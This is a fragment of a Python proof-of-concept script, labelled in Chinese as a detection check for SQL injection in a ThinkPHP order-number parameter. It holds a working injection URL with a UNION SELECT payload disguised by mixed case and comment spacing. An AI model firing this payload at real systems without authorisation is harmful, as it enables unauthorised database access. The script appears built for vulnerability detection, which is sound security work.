...
def poc(target):
    ...
    try:
        vurl = urllib.parse.urljoin(target,'index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+')
...
def main():
    parser = argparse.ArgumentParser("Thinkphp订单编号SQL注入漏洞检测POC")
